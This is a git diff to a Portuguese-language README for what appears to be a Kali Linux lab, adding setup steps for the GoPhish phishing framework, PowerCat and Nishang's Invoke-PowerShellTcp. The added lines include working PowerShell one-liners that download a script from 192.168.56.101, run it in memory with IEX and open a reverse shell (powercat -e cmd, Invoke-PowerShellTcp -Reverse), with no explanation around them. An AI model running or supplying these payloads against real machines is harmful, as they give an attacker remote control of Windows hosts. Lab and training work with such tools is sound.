@@ -21,6 +21,39 @@ https://drive.google.com/file/d/12xLX9p-XiLgWqn1eLAse1OUe8QsqScqQ/view?usp=drive
 https://ubuntu.com/download/server
 
 ## Kali Linux
-´´´
-teste
-´´´
+### Atualização
+```
+$ sudo su
+# apt update
+# apt upgrade -y
+```
+### GoPhish
+https://github.com/gophish/gophish
+```
+$ sudo mkdir /opt/git
+$ sudo chown -R kali:kali /opt/git/
+$ cd /opt/git
+$ git clone https://github.com/gophish/gophish.git
+$ cd gophish
+$ ls -l
+$ sudo apt install golang -y
+$ go build
+```
+### PowerCat
+https://github.com/besimorhino/powercat
+```
+$ mkdir ~/THA/
+$ cd ~/THA/
+$ wget https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1
+
+IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.101/powercat.ps1'); powercat -c 192.168.56.101 -p 443 -e cmd
+```
+### Invoke-PowerShellTCP
+https://github.com/besimorhino/powercat
+```
+$ cd ~/THA/
+$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
+
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -Port 4444
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')
+```
